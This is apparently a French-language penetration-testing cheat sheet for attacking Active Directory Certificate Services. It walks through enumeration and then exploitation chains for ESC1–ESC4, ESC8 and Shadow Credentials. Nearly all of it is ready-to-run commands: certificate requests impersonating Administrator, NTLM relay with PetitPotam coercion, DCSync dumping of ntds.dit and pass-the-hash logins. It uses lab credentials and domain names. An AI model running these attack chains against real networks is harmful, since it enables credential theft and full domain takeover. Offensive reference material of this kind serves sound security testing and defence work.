https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adcs-certificate-services/
# Énumération

## Réseau uniquement
```bash
# ADCS expose des interfaces web par défaut
curl -k https://dc.domain.local/certsrv
nmap -p 443,80 --script http-title <dc_ip>
```

## Certify
```powershell
cd C:\Tools\Certify\Certify\bin\Release
.\Certify.exe enum-cas
.\Certify.exe enum-templates
.\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
```
## Certipy
```bash
certipy find -u user@domain.local -p 'Password' -dc-ip 192.168.1.1
certipy find -u user@domain.local -p 'Password' -dc-ip 192.168.1.1 -vulnerable
```
## NetExec
```bash
netexec ldap domain.lab -u username -p password -M adcs
```
## ldapsearch
```bash
ldapsearch -H ldap://dc_IP -x -LLL -D 'user@domain.local' -w '<password>' -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local" dNSHostName
```

# Sortie Certipy

| Champ                              | Description                                                                                                                                             |
| ---------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Template Name`                    | Nom du template de certificat dans l'AD                                                                                                                 |
| `Enabled`                          | Indique si le template est actif et utilisable                                                                                                          |
| `Publishing CAs`                   | CA(s) qui publient ce template et acceptent les requêtes dessus                                                                                         |
| `Schema Version`                   | Version du schéma du template (1 = ancien, 2+ = supporte les extensions avancées)                                                                       |
| `Validity Period`                  | Durée de validité du certificat émis                                                                                                                    |
| `Renewal Period`                   | Période avant expiration pendant laquelle un renouvellement est possible                                                                                |
| `Certificate Name Flag`            | Contrôle qui définit le sujet du certificat. Vuln si `ENROLLEE_SUPPLIES_SUBJECT` (le demandeur choisit le SAN → ESC1)                                   |
| `Enrollment Flag`                  | Options supplémentaires appliquées lors de l'enrollment. Vuln si `CT_FLAG_NO_SECURITY_EXTENSION` (pas d'extension szOID → ESC9/ESC10)                   |
| `Manager Approval Required`        | Indique si un admin CA doit approuver manuellement chaque requête. Vuln si `False` (pas de contrôle humain)                                             |
| `Authorized Signatures Required`   | Nombre de signatures nécessaires pour soumettre une requête. Vuln si `0` (pas besoin d'enrollment agent)                                                |
| `Extended Key Usage`               | Usages autorisés. Vuln si `Client Authentication`, `Smart Card Logon`, `PKINIT Client Authentication`, `Any Purpose`, ou vide (aucun EKU = tout usage)  |
| `Certificate Application Policies` | Politiques d'application associées, souvent identiques à l'EKU sur les templates v2+. Mêmes valeurs vulnérables que l'EKU                               |
| `Vulnerabilities`                  | Classification automatique par Certipy des vulnérabilités détectées sur ce template                                                                     |
| `Enrollment Rights`                | Groupes/utilisateurs autorisés à demander un certificat. Vuln si un groupe large type `Domain Users`, `Domain Computers`, `Authenticated Users`         |
| `Object Control Permissions`       | ACLs sur l'objet template dans l'AD. Vuln si `WriteDacl`, `WriteOwner`, `WriteProperty`, `GenericAll`, `GenericWrite` pour un groupe non-admin (→ ESC4) |

# ESC1

## Pré-requis

```
Enabled                               : True
Certificate Name Flag                 : ENROLLEE_SUPPLIES_SUBJECT
Manager Approval Required             : False
Authorized Signatures Required        : 0
Extended Key Usage                    : Client Authentication
Certificate Application Policies      : Client Authentication
Permissions
  Enrollment Permissions
	Enrollment Rights           : CONTOSO\Domain Users
```
## Certify
```powershell
.\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC1 --upn Administrator --quiet
```

```powershell
.\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:[CERT] /enctype:aes256 /nowrap
```
## Certipy
```bash
certipy req -u 'jaime.lannister'@sevenkingdoms.local -p 'pasdebraspasdechocolat' -target kingslanding.sevenkingdoms.local -template ESC1 -ca SEVENKINGDOMS-CA -upn administrator@sevenkingdoms.local
```

```bash
certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
```


# ESC2
```
Enabled                               : True
Manager Approval Required             : False
Authorized Signatures Required        : 0
Extended Key Usage                    : Any Purpose
Certificate Application Policies      : Any Purpose
Permissions
  Enrollment Permissions
	Enrollment Rights           : CONTOSO\Domain Users
```

- Si Certificate Name Flag: ENROLLEE_SUPPLIES_SUBJECT -> ESC1
- Si non -> ESC3

# ESC3
## Pré-requis
```
Enabled                               : True
Manager Approval Required             : False
Authorized Signatures Required        : 0
Extended Key Usage                    : Certificate Request Agent
Certificate Application Policies      : Certificate Request Agent
Permissions
  Enrollment Permissions
	Enrollment Rights           : CONTOSO\Domain Users
```
## Certify

D'abord, demander un certificat à partir de ce template en utilisant le contexte de l'utilisateur courant.
```powershell
.\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC3 --quiet
```

Ensuite, utiliser ce certificat pour demander un autre certificat au nom d'un autre utilisateur.  Un template comme _User_ est un bon candidat, car il a l'EKU Client Authentication activé.
```powershell
.\Certify.exe request-agent --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template User --target Administrator --agent-pfx MIACAQ[...snip...]AAAAA= --quiet
```

## Certipy

Demander le certificat
```bash
certipy req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template ESC2 -ca ESSOS-CA
```
Demander un certificat avec le certificat Certificate Request Agent obtenu précédemment (-pfx)
```bash
certipy req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template User -ca ESSOS-CA -on-behalf-of 'essos\administrator' -pfx khal.drogo.pfx
```
Authentification
```bash
certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
```

# ESC4

## Pré-requis

```
Permissions
  Enrollment Permissions
	Enrollment Rights           : CONTOSO\Domain Users
  Object Control Permissions
	Write Owner                 : CONTOSO\Domain Users
	Write Dacl                  : CONTOSO\Domain Users
	Write Property              : CONTOSO\Domain Users
```
## Certify
La commande manage-template de Certify permet d'abuser de ces permissions. On peut :
- S'octroyer des droits d'enrollment avec ``--enroll SID``, où ``SID`` est le ``SID`` d'un principal (ex. un utilisateur ou un groupe du domaine).
- Activer/désactiver l'approbation du manager avec ``--manager-approval`` et définir le nombre de signatures autorisées requises avec ``--authorized-signatures`` 0.
- Activer/désactiver les EKU autorisant l'authentification client avec ``--client-auth``, ``--pkinit-auth`` ou ``--smartcard-logon``.
- Activer/désactiver le flag **ENROLLEE_SUPPLIES_SUBJECT** avec ``--supply-subject``.

Dans cet exemple, l'EKU _Client Authentication_ est déjà activé ; il suffit donc d'ajouter le flag **ENROLLEE_SUPPLIES_SUBJECT** puis de reproduire ESC1.

```powershell
.\Certify.exe manage-template --template ESC4 --supply-subject --quiet
```
## Certipy
Prendre le template ESC4 et le rendre vulnérable à la technique ESC1 en utilisant le privilège genericWrite obtenu. (on ne définit pas la cible ici car on cible le LDAP)
```bash
certipy template -u khal.drogo@essos.local -p 'horse' -template ESC4 -save-old -debug
```

Exploiter ESC1 sur le template ESC4 modifié
```bash
certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC4 -ca ESSOS-CA -upn administrator@essos.local
```

Authentification avec le pfx
```bash
certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
```

Restaurer la configuration du template
```bash
certipy template -u khal.drogo@essos.local -p 'horse' -template ESC4 -configuration ESC4.json
```
# ESC8

Pré-requis :

* ADCS actif sur le domaine avec le web enrollment activé.
* Une méthode de coerce fonctionnelle (ici on utilise petitpotam non authentifié, mais un printerbug authentifié ou une autre méthode de coerce fonctionnera pareil)
* Il existe un template utile pour exploiter ESC8, par défaut sur un Active Directory il s'appelle _DomainController_

Vérifions que le web enrollment est actif à l'adresse : http://192.168.56.23/certsrv/certfnsh.asp

Ajouter un listener pour relayer l'authentification SMB vers HTTP avec impacket ntlmrelayx

```bash
ntlmrelayx.py -t http://192.168.56.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

Lancer le coerce avec petitpotam non authentifié (cela ne fonctionnera plus sur un Active Directory à jour, mais les autres méthodes de coerce authentifiées fonctionneront pareil). ntlmrelayx va relayer l'authentification vers le web enrollment et récupérer le certificat

```bash
python PetitPotam.py <LOCAL_IP> <SRV_IP_TO_COERCE>
```

Demander un TGT avec le certificat que l'on vient d'obtenir

```bash
python gettgtpkinit.py -cert-pfx MACHINE\$.pfx domain.com/machine$ 'machine.ccache'
```

On a maintenant un TGT pour meereen, on peut donc lancer un DCsync et récupérer tout le contenu de ntds.dit.

```bash
export KRB5CCNAME=/home/pentester/Tools/PKINITtools/machine.ccache
nxc smb meereen.essos.local -k --use-kcache
nxc smb meereen.essos.local -k --use-kcache --ntds
secretsdump -k -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local
```

Se connecter avec pass-the-hash

```bash
nxc smb meereen.essos.local -u 'Administrateur' -H '4dcaa3baa4c8eddca29e2793490fc9b8'
```

# Shadow Credentials

![shadow_credentials](img/shadow_creds.png)

PKINIT permet de s'authentifier à Kerberos de façon asymétrique, avec une paire de clés plutôt qu'un mot de passe. L'attribut ``msDS-KeyCredentialLink`` des objets utilisateur/ordinateur contient les clés publiques acceptées pour cette authentification. Si on peut écrire cet attribut sur un objet cible, on y ajoute sa propre clé publique et on obtient alors un TGT pour cet objet (accès persistant et furtif).

## Méthode NTLM Relay

```bash
ntlmrelayx.py -t ldaps://192.168.56.12 --remove-mic -smb2support --shadow-credentials
```

```bash
python3 PetitPotam.py -u khal.drogo -p horse 192.168.56.129 braavos.essos.local
```

```bash
python3 gettgtpkinit.py -cert-pfx l4HvSu19.pfx -pfx-pass 0IHQeDUwBbshb0o0BOSy essos.local/BRAAVOS$ l4HvSu19.ccache
```

```bash
export KRB5CCNAME=/home/pentester/Tools/PKINITtools/l4HvSu19.ccache
```

## Méthode d'exploitation par ACL

[ACL - GenericWrite](4.%20ACL.md#GenericWrite)